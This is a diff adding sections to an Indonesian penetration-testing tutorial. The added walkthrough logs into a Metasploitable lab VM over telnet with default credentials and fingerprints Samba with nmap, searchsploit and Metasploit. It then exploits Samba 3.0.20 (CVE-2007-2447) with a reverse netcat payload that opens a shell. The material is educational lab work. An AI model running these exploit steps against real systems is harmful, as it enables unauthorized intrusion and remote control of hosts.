@@ -1072,6 +1072,16 @@ Kita juga dapat mencari exploit melalui pihak ketiga melalui internet, ketik di 
 
 Nessus adalah tools vurnerability analysis yang memiliki beberapa versi berbayar maupun yang gratis. Download Nessus versi essensial disini [https://www.tenable.com/products/nessus/nessus-essentials](https://www.tenable.com/products/nessus/nessus-essentials) untuk yang versi gratis.
 
+Cara install nessus bisa dilihat [disini](https://www.youtube.com/watch?v=k5vUaH0Iepk) atau di [documentation](https://docs.tenable.com/nessus/Content/InstallNessusLinux.htm) resmi.
+
+Setelah terinstall kita perlu menjalankan service nessus
+
+```bash
+sudo /bin/systemctl start nessusd.service
+```
+
+Kemudian buka browser dengan link `https://ip-address:8834/`
+
 Berikut tampilan nessus dengan hasil scanning vurnerability analysis dari metasploitable dengan ip 192.168.1.22.
 
 ![Nessus scanning](img/nessus1.png)
@@ -1350,4 +1360,553 @@ lo        Link encap:Local Loopback
 ```
 
 Kita sudah berada dalam shell target. 
-Untuk keluar ketik `exit`.
+Untuk keluar ketik `exit` atau `quit`.
+
+### Exploit telnet pada Metasploitable
+
+Exploit telnet pada metasploitable tidaklah sulit karena secara default kita tidak perlu menggunakan metasploit framework.
+
+```bash
+$ nmap -sV 192.168.1.22
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 21:27 +08
+Nmap scan report for 192.168.1.22 (192.168.1.22)
+Host is up (0.027s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 08:00:27:27:B4:9C (Oracle VirtualBox virtual NIC)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
+```
+
+Dari hasil di atas port ternet terbuka pada port `23/tcp`, kita bisa langsung masuk ke dalam system target metasploitable melalui telnet dengan user dan password `msfadmin` dengan perintah:
+
+```bash
+$ telnet 192.168.1.22  
+
+Trying 192.168.1.22...
+Connected to 192.168.1.22.
+Escape character is '^]'.
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+metasploitable login: msfadmin
+Password: 
+Last login: Sun Dec 15 07:56:34 EST 2024 from 192.168.1.21 on pts/1
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+No mail.
+```
+
+### Exploit Samba
+
+Scan versi service
+
+```bash
+$ nmap -sV 192.168.1.22
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 21:27 +08
+Nmap scan report for 192.168.1.22 (192.168.1.22)
+Host is up (0.027s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 08:00:27:27:B4:9C (Oracle VirtualBox virtual NIC)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
+```
+
+Dari output di atas kita menemukan port samba yang terbuka, cuma masalahnya versi samba tidak jelas. Kita bisa saja menggunakan perintah `searchsploit samba`
+
+```bash
+$ searchsploit samba
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                  |  Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote File Inclusions                                                                                                                  | php/webapps/4575.txt
+Microsoft Windows XP/2003 - Samba Share Resource Exhaustion (Denial of Service)                                                                                                 | windows/dos/148.sh
+Samba 1.9.19 - 'Password' Remote Buffer Overflow                                                                                                                                | linux/remote/20308.c
+Samba 2.0.7 - SWAT Logfile Permissions                                                                                                                                          | linux/local/20341.sh
+Samba 2.0.7 - SWAT Logging Failure                                                                                                                                              | unix/remote/20340.c
+Samba 2.0.7 - SWAT Symlink (1)                                                                                                                                                  | linux/local/20338.c
+Samba 2.0.7 - SWAT Symlink (2)                                                                                                                                                  | linux/local/20339.sh
+Samba 2.0.x - Insecure TMP File Symbolic Link                                                                                                                                   | linux/local/20776.c
+Samba 2.0.x/2.2 - Arbitrary File Creation                                                                                                                                       | unix/remote/20968.txt
+Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                                                    | osx/remote/9924.rb
+Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                                                                         | linux/remote/16321.rb
+Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                               | bsd_x86/remote/16880.rb
+Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                                                                                 | linux/local/23674.txt
+Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                             | linux_x86/remote/16861.rb
+Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                               | osx_ppc/remote/16876.rb
+Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                         | solaris_sparc/remote/16330.rb
+Samba 2.2.8 - Brute Force Method Remote Command Execution                                                                                                                       | linux/remote/55.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                                                                                      | unix/remote/22468.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                                                                                      | unix/remote/22469.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                                                                                      | unix/remote/22470.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                                                                                      | unix/remote/22471.txt
+Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                                                                            | linux/remote/9936.rb
+Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                                                                         | unix/remote/22356.c
+Samba 2.2.x - Remote Buffer Overflow                                                                                                                                            | linux/remote/7.pl
+Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                            | osx/remote/16875.rb
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                          | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                | unix/remote/16320.rb
+Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                                                              | linux/remote/9950.rb
+Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                          | linux/remote/16859.rb
+Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                        | solaris/remote/16329.rb
+Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                                                                        | linux/dos/4732.c
+Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                                                                               | multiple/dos/5712.pl
+Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                                                                | linux/remote/364.pl
+Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption (Metasploit)                                                                                                         | linux_x86/remote/16860.rb
+Samba 3.3.5 - Format String / Security Bypass                                                                                                                                   | linux/remote/33053.txt
+Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                                                                     | linux/remote/21850.rb
+Samba 3.4.5 - Symlink Directory Traversal                                                                                                                                       | linux/remote/33599.txt
+Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                                                                          | linux/remote/33598.rb
+Samba 3.4.7/3.5.1 - Denial of Service                                                                                                                                           | linux/dos/12588.txt
+Samba 3.5.0 - Remote Code Execution                                                                                                                                             | linux/remote/42060.py
+Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                                                                                    | linux/remote/42084.rb
+Samba 3.5.11/3.6.3 - Remote Code Execution                                                                                                                                      | linux/remote/37834.py
+Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                                                                                      | linux/dos/27778.txt
+Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory                                                                                                        | multiple/remote/41740.txt
+Samba < 2.0.5 - Local Overflow                                                                                                                                                  | linux/local/19428.c
+Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                               | multiple/remote/10.c
+Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                           | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                   | linux_x86/dos/36741.py
+Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service                                                                                                                         | windows/dos/2934.php
+Sambar Server 4.1 Beta - Admin Access                                                                                                                                           | cgi/remote/20570.txt
+Sambar Server 4.2 Beta 7 - Batch CGI                                                                                                                                            | windows/remote/19761.txt
+Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                                                                                       | windows/remote/20223.txt
+Sambar Server 4.4/5.0 - 'pagecount' File Overwrite                                                                                                                              | multiple/remote/21026.txt
+Sambar Server 4.x/5.0 - Insecure Default Password Protection                                                                                                                    | multiple/remote/21027.txt
+Sambar Server 5.1 - Sample Script Denial of Service                                                                                                                             | windows/dos/21228.c
+Sambar Server 5.1 - Script Source Disclosure                                                                                                                                    | cgi/remote/21390.txt
+Sambar Server 5.x - 'results.stm' Cross-Site Scripting                                                                                                                          | windows/remote/22185.txt
+Sambar Server 5.x - Information Disclosure                                                                                                                                      | windows/remote/22434.txt
+Sambar Server 5.x - Open Proxy / Authentication Bypass                                                                                                                          | windows/remote/24076.txt
+Sambar Server 5.x/6.0/6.1 - 'results.stm' indexname Cross-Site Scripting                                                                                                        | windows/remote/25694.txt
+Sambar Server 5.x/6.0/6.1 - logout RCredirect Cross-Site Scripting                                                                                                              | windows/remote/25695.txt
+Sambar Server 5.x/6.0/6.1 - Server Referer Cross-Site Scripting                                                                                                                 | windows/remote/25696.txt
+Sambar Server 6 - Search Results Buffer Overflow (Metasploit)                                                                                                                   | windows/remote/16756.rb
+Sambar Server 6.0 - 'results.stm' POST Buffer Overflow                                                                                                                          | windows/dos/23664.py
+Sambar Server 6.1 Beta 2 - 'show.asp?show' Cross-Site Scripting                                                                                                                 | windows/remote/24161.txt
+Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitrary File Access                                                                                                                  | windows/remote/24163.txt
+Sambar Server 6.1 Beta 2 - 'showperf.asp?title' Cross-Site Scripting                                                                                                            | windows/remote/24162.txt
+SWAT Samba Web Administration Tool - Cross-Site Request Forgery                                                                                                                 | cgi/webapps/17577.txt
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+```
+
+Cuman masalah lain muncul yaitu versi yang muncul banyak karena kita tidak memasukan versi spesifik pada pencarian. Kita bisa saja mencoba satu persatu tapi akan kurang efektif.
+
+__Menggunakan scanner pada metasploit__
+
+Metasploit mempunyai modules `auxiliary` pada direktori modules, yang di dalamnya terdapat direktori `scanner` yang bisa kita gunakan.
+
+```bash
+$ cd /usr/share/metasploit-framework/modules/auxiliary/scanner
+
+$ ls
+
+acpp      chargen  dect       emc     gopher  ike   jenkins   llmnr      misc      msf     mysql    nexpose  openvas     portmap   quake  rservices  scada  snmp   teamcity   tftp      varnish  vxworks  x11
+afp       couchdb  discovery  etcd    gprs    imap  kademlia  lotus      mongodb   msmail  natpmp   nfs      oracle      portscan  rdp    rsync      sip    ssh    telephony  ubiquiti  vmware   winrm
+amqp      db2      dlsw       finger  h323    ip    kerberos  mdns       motorola  msmq    nessus   nntp     pcanywhere  postgres  redis  sage       smb    ssl    telnet     udp       vnc      wproxy
+backdoor  dcerpc   dns        ftp     http    ipmi  ldap      memcached  mqtt      mssql   netbios  ntp      pop3        printer   rogue  sap        smtp   steam  teradata   upnp      voice    wsdd
+```
+
+Di dalam `scanner` kita tinggal memilih untuk menggunakan modules yang akan kita gunakan, dalam kasus ini kita akan menggunakan modules `smb` untuk mencari versi samba yang kita cari.
+
+```bash
+$ cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smb
+
+$ ls
+impacket         pipe_dcerpc_auditor.rb    smb_enum_gpp.rb    smb_enumusers.rb         smb_login.rb      smb_ms17_010.rb     smb_version.rb
+pipe_auditor.rb  psexec_loggedin_users.rb  smb_enumshares.rb  smb_enumusers_domain.rb  smb_lookupsid.rb  smb_uninit_cred.rb
+```
+
+Dalam direktori `smb` terdapat file `smb_version.rb` yangf bisa kita gunakan untuk mencari versi samba. Selanjutnya kita akan menggunakan metasploit untuk mencari/scannning versi samba.
+
+```bash
+$ msfconsole  
+
+Metasploit tip: Use the edit command to open the currently active module 
+in your editor
+                                                  
+                                   ___          ____
+                               ,-""   `.      < HONK >
+                             ,'  _   e )`-._ /  ----
+                            /  ,' `-._<.===-'
+                           /  /
+                          /  ;
+              _          /   ;
+ (`._    _.-"" ""--..__,'    |
+ <_  `-""                     \
+  <`-                          :
+   (__   <__.                  ;
+     `-.   '-.__.      _.'    /
+        \      `-.__,-'    _,'
+         `._    ,    /__,-'
+            ""._\__,'< <____                                                                                                                                                                                      
+                 | |  `----.`.                                                                                                                                                                                    
+                 | |        \ `.                                                                                                                                                                                  
+                 ; |___      \-``                                                                                                                                                                                 
+                 \   --<                                                                                                                                                                                          
+                  `.`.<                                                                                                                                                                                           
+                    `-'                                                                                                                                                                                           
+                                                                                                                                                                                                                  
+                                                                                                                                                                                                                  
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2467 exploits - 1273 auxiliary - 431 post       ]
++ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > 
+```
+
+Kita sudah mengetahui lokasi file samba scanner yang berada dalam `auxiliary/scanner/smb/`
+
+```bash
+msf6 > use auxiliary/scanner/smb/
+
+Matching Modules
+================
+
+   #   Name                                         Disclosure Date  Rank    Check  Description
+   -   ----                                         ---------------  ----    -----  -----------
+   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal  No     DCOM Exec
+   1   auxiliary/scanner/smb/impacket/secretsdump   .                normal  No     DCOM Exec
+   2   auxiliary/scanner/smb/smb_ms17_010           .                normal  No     MS17-010 SMB RCE Detection
+   3     \_ AKA: DOUBLEPULSAR                       .                .       .      .
+   4     \_ AKA: ETERNALBLUE                        .                .       .      .
+   5   auxiliary/scanner/smb/psexec_loggedin_users  .                normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
+   6   auxiliary/scanner/smb/smb_enumusers_domain   .                normal  No     SMB Domain User Enumeration
+   7   auxiliary/scanner/smb/smb_enum_gpp           .                normal  No     SMB Group Policy Preference Saved Passwords Enumeration
+   8   auxiliary/scanner/smb/smb_login              .                normal  No     SMB Login Check Scanner
+   9   auxiliary/scanner/smb/smb_lookupsid          .                normal  No     SMB SID User Enumeration (LookupSid)
+   10    \_ action: DOMAIN                          .                .       .      Enumerate domain accounts
+   11    \_ action: LOCAL                           .                .       .      Enumerate local accounts
+   12  auxiliary/scanner/smb/pipe_auditor           .                normal  No     SMB Session Pipe Auditor
+   13  auxiliary/scanner/smb/pipe_dcerpc_auditor    .                normal  No     SMB Session Pipe DCERPC Auditor
+   14  auxiliary/scanner/smb/smb_enumshares         .                normal  No     SMB Share Enumeration
+   15  auxiliary/scanner/smb/smb_enumusers          .                normal  No     SMB User Enumeration (SAM EnumUsers)
+   16  auxiliary/scanner/smb/smb_version            .                normal  No     SMB Version Detection
+   17  auxiliary/scanner/smb/smb_uninit_cred        .                normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   18  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal  No     WMI Exec
+
+
+Interact with a module by name or index. For example info 18, use 18 or use auxiliary/scanner/smb/impacket/wmiexec
+
+msf6 > use 16
+msf6 auxiliary(scanner/smb/smb_version) > 
+```
+
+Kita sudah masuk kedalam mode msfconsole untuk mencari versi samba. Selanjutnya kita perlu melakukan konfigurasi tambahan sebelum di `run` yaitu memasukan ip address target.
+
+```bash
+msf6 auxiliary(scanner/smb/smb_version) > show info
+
+       Name: SMB Version Detection
+     Module: auxiliary/scanner/smb/smb_version
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  hdm <x@hdm.io>
+  Spencer McIntyre
+  Christophe De La Fuente
+
+Check supported:
+  No
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT                     no        The target port (TCP)
+  THREADS  1                yes       The number of concurrent threads (max one per host)
+
+Description:
+  Fingerprint and display version information about SMB servers. Protocol
+  information and host operating system (if available) will be reported.
+  Host operating system detection requires the remote server to support
+  version 1 of the SMB protocol. Compression and encryption capability
+  negotiation is only present in version 3.1.1.
+
+
+View the full module info with the info -d command.
+
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.22
+RHOSTS => 192.168.1.22
+msf6 auxiliary(scanner/smb/smb_version) > show options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS   192.168.1.22     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT                     no        The target port (TCP)
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_version) > run
+
+[*] 192.168.1.22:445      -   Host could not be identified: Unix (Samba 3.0.20-Debian)
+[*] 192.168.1.22:         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_version) > 
+```
+
+Banggggg!!!! kita sudah menemukan versi samba yaitu `Samba 3.0.20`.
+
+__Exploit Samba 3.0.20__
+
+Setelah versi samba diketahui kemudian kita akan mencari exploit samba:
+
+```bash
+$ searchsploit samba 3.0.20
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                  |  Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                          | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                | unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                           | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                   | linux_x86/dos/36741.py
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+Ok... dari hasil pencarian kita menemukan exploit `Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)` yang berlokasi `unix/remote/16320.rb`.
+
+Selanjutnya kita masuk ke dalam metasploit lagi, dan menggunakan exploit yang sudah kita temukan.
+
+```bash
+$ msfconsole
+
+Metasploit tip: To save all commands executed since start up to a file, use the 
+makerc command
+                                                  
+
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
+  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
+  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
+  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
+   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
+    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
+     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
+      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
+       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
+         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
+           :kk;.OOOOOOOOOOOOO.;Ok:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2467 exploits - 1273 auxiliary - 431 post       ]
++ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search Samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf6 >
+msf6 > search Samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf6 > use 0
+
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > show info
+
+       Name: Samba "username map script" Command Execution
+     Module: exploit/multi/samba/usermap_script
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2007-05-14
+
+Provided by:
+  jduck <jduck@metasploit.com>
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT   139              yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+
+Description:
+  This module exploits a command execution vulnerability in Samba
+  versions 3.0.20 through 3.0.25rc3 when using the non-default
+  "username map script" configuration option. By specifying a username
+  containing shell meta characters, attackers can execute arbitrary
+  commands.
+
+  No authentication is needed to exploit this vulnerability since
+  this option is used to map usernames prior to authentication!
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
+  OSVDB (34700)
+  http://www.securityfocus.com/bid/23972
+  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
+  http://samba.org/samba/security/CVE-2007-2447.html
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > set RHOST 192.168.1.22
+RHOST => 192.168.1.22
+msf6 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.1.22     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.21     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+```
+
+Pada bagian `LHOST  192.168.1.21`, ip address tersebut adalah ip address Kali Linux kita. Kemudian kita tinggal menjalankan `run` atau `exploit`
+
+```bash
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.21:4444 
+[*] Command shell session 1 opened (192.168.1.21:4444 -> 192.168.1.22:57480) at 2024-12-15 21:58:25 +0800
+```
+
+Banggg......!!! berhasil.
